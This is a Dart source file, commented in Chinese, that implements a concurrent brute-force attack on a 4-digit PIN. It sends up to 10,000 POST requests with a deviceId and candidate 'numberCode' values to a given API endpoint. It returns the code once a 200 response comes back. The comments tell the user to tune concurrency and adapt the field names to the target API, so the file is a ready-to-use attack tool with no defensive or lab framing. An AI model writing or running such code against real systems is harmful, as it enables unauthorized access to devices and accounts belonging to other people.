import 'dart:async';

import 'package:dio/dio.dart';

/// 暴力破解 4 位数字密码
///
/// [url]      : API 端点
/// [headers]  : 请求头（例如认证信息）
/// [concurrency] : 并发请求数（建议 10~30，根据设备性能调整）
/// [timeout]  : 单个请求超时时间
/// 返回正确密码字符串，若未找到则返回 null
Future<String?> bruteForcePassword({
  required String url,
  required Map<String, dynamic> headers,
  required String deviceId,
  int concurrency = 20,
  Duration timeout = const Duration(seconds: 10),
}) async {
  // 创建 Dio 实例，复用连接池提高效率
  final dio = Dio(
    BaseOptions(
      headers: headers,
      connectTimeout: timeout,
      receiveTimeout: timeout,
    ),
  );

  final completer = Completer<String?>(); // 用于等待最终结果
  final cancelTokens = <CancelToken>[]; // 存储所有活跃请求的取消令牌
  int currentIndex = 0; // 下一个待测试的密码索引
  final total = 10000; // 总密码数
  bool found = false; // 是否已找到正确密码

  // 工作函数：每个并发任务循环取密码并发送请求
  Future<void> worker() async {
    while (!found && !completer.isCompleted) {
      // 原子性获取下一个密码索引（同步操作，无需加锁）
      final index = currentIndex++;
      if (index >= total) break; // 所有密码已测试完

      final password = index.toString().padLeft(4, '0');
      final cancelToken = CancelToken();

      // 记录令牌，以便后续批量取消
      cancelTokens.add(cancelToken);

      try {
        final response = await dio.post(
          url,
          data: {
            "deviceId": deviceId,
            "numberCode": password,
          }, // 根据实际 API 调整字段名
          cancelToken: cancelToken,
        );

        if (response.statusCode == 200 && !found) {
          found = true;
          completer.complete(password);
          return; // 当前任务结束，其他任务将被取消
        }
      } on DioException catch (e) {
        // 请求被主动取消时正常退出
        if (CancelToken.isCancel(e)) return;
        // 其他异常（网络错误、超时等）忽略，继续尝试下一个密码
      } finally {
        cancelTokens.remove(cancelToken); // 清理已完成的令牌
      }
    }
  }

  // 启动指定数量的并发任务
  final workers = List.generate(concurrency, (_) => worker());

  // 等待结果（直到找到密码或所有任务完成）
  final result = await completer.future;

  // 找到密码后，立即取消所有未完成的请求
  for (final token in cancelTokens) {
    token.cancel('Password found');
  }

  // 等待所有工作线程结束（释放资源）
  await Future.wait(workers, eagerError: true);

  return result;
}
